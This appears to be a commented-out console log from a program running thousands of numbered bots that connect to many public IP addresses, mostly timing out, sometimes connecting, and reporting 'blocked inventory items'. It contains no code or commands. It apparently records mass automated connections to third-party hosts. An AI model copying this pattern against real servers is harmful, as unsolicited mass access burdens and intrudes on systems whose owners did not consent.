# [Bot 12575] ✗ Failed to connect to 183.97.237.46: [Errno 111] Connection refused
# [Bot 8915] ✗ Failed to connect to 162.247.55.228: timed out[Bot 8918] ✗ Failed to connect to 82.66.72.212: timed out
# [Bot 8917] ✗ Failed to connect to 69.226.232.231: timed out[Bot 13893] ✗ Failed to connect to 24.22.187.236: [Errno 113] No route to host[Bot 4915] ✗ Failed to connect to 62.45.67.37: timed out[Bot 4917] ✗ Failed to connect to 79.140.115.222: timed out
# [Bot 4933] ✗ Failed to connect to 144.76.63.74: timed out
# [Bot 4925] ✗ Failed to connect to 90.176.169.23: timed out
#
# [Bot 3139] 🚫 Blocked 1 inventory items
#
# [Bot 6831] ✗ Failed to connect to 120.29.27.134: timed out
#
#
#
# [Bot 4921] ✗ Failed to connect to 79.150.20.34: timed out
#
# [Bot 8922] ✗ Failed to connect to 93.36.218.166: timed out
# [Bot 479] 🚫 Blocked 6 inventory items
#
# [Bot 12529] ✗ Failed to connect to 73.97.186.244: [Errno 104] Connection reset by peer[Bot 6839] ✗ Failed to connect to 190.148.50.9: timed out[Bot 6833] ✗ Failed to connect to 155.133.4.3: timed out
#
# [Bot 6841] ✗ Failed to connect to 176.99.3.58: timed out[Bot 8924] ✗ Failed to connect to 94.23.160.240: timed out
# [Bot 13946] ✗ Failed to connect to 172.81.182.43: [Errno 111] Connection refused
#
# [Bot 9916] ✗ Failed to connect to 66.81.174.113: timed out
# [Bot 2853] 🚫 Blocked 1 inventory items[Bot 6847] ✗ Failed to connect to 213.165.84.70: timed out
# [Bot 6646] 🚫 Blocked 33 inventory items[Bot 13894] ✗ Failed to connect to 78.157.167.86: [Errno 101] Network is unreachable
# [Bot 10782] 🚫 Blocked 513 inventory items
# [Bot 6856] ✗ Failed to connect to 54.37.157.85: timed out
# [Bot 6864] ✗ Failed to connect to 143.105.119.104: timed out[Bot 6851] ✗ Failed to connect to 148.113.214.103: timed out
# [Bot 12547] ✓ Connected to 188.119.67.137
# [Bot 3332] 🚫 Blocked 500 inventory items
# [Bot 13892] ✗ Failed to connect to 78.62.92.73: [Errno 113] No route to host[Bot 12366] ✓ Connected to 139.162.128.167
# [Bot 4951] ✗ Failed to connect to 193.142.201.168: timed out
# [Bot 8930] ✗ Failed to connect to 217.245.145.198: timed out
# [Bot 8929] ✗ Failed to connect to 82.45.249.151: timed out[Bot 12655] ✓ Connected to 98.169.81.233
#
#
# [Bot 6881] ✗ Failed to connect to 159.196.13.131: timed out
#
#
# [Bot 6895] ✗ Failed to connect to 62.195.214.250: timed out[Bot 12679] ✓ Connected to 104.1.209.172[Bot 4985] ✗ Failed to connect to 76.21.188.174: timed out
# [Bot 4965] ✗ Failed to connect to 198.57.85.191: timed out
# [Bot 6888] ✗ Failed to connect to 90.248.159.92: timed out
# [Bot 6893] ✗ Failed to connect to 115.186.234.2: timed out
# [Bot 3948] 🚫 Blocked 21 inventory items
# [Bot 6146] 🚫 Blocked 11 inventory items
# [Bot 7761] 🚫 Blocked 20 inventory items
# [Bot 2131] 🚫 Blocked 29 inventory items
# [Bot 8935] ✗ Failed to connect to 45.80.184.42: timed out
# [Bot 13938] ✓ Connected to 45.33.1.97[Bot 6898] ✗ Failed to connect to 222.236.153.125: timed out[Bot 6897] ✗ Failed to connect to 176.84.13.216: timed out[Bot 13965] ✗ Failed to connect to 121.127.44.22: [Errno 111] Connection refused[Bot 8934] ✗ Failed to connect to 138.88.241.173: timed out
# [Bot 6905] ✗ Failed to connect to 87.187.149.123: timed out[Bot 6904] ✗ Failed to connect to 178.229.167.163: timed out
# [Bot 6907] ✗ Failed to connect to 71.163.9.123: timed out
# [Bot 2356] 🚫 Blocked 1 inventory items
# [Bot 8749] 🚫 Blocked 16 inventory items[Bot 12612] ✓ Connected to 207.154.230.25[Bot 1771] 🚫 Blocked 25 inventory items[Bot 5002] ✗ Failed to connect to 83.31.203.193: timed out[Bot 8940] ✗ Failed to connect to 49.228.177.67: timed out
# [Bot 13883] ✓ Connected to 196.42.22.254
# [Bot 9712] 🚫 Blocked 7 inventory items
# [Bot 6927] ✗ Failed to connect to 85.255.234.52: timed out[Bot 6935] ✗ Failed to connect to 45.95.236.29: timed out[Bot 6949] ✗ Failed to connect to 107.220.56.138: timed out
# [Bot 11826] ✗ Failed to connect to 185.253.52.28: Socket closed while reading header
# [Bot 12479] ✓ Connected to 103.47.56.4
# [Bot 6939] ✗ Failed to connect to 190.130.99.246: timed out
# [Bot 1047] 🚫 Blocked 1 inventory items
# [Bot 12650] ✗ Failed to connect to 180.87.165.26: [Errno 113] No route to host[Bot 4329] 🚫 Blocked 27 inventory items
# [Bot 9039] 🚫 Blocked 13 inventory items
# [Bot 1512] 🚫 Blocked 18 inventory items[Bot 11846] ✗ Failed to connect to 51.158.62.115: Socket closed while reading header
# [Bot 6934] ✗ Failed to connect to 18.193.102.175: timed out
#
# [Bot 6417] 🚫 Blocked 1 inventory items
# [Bot 15707] ✗ Failed to connect to 195.240.58.179: [Errno 113] No route to host
# [Bot 707] 🚫 Blocked 5 inventory items
# [Bot 12050] 🚫 Blocked 1 inventory items
# [Bot 6933] ✗ Failed to connect to 23.125.91.62: timed out
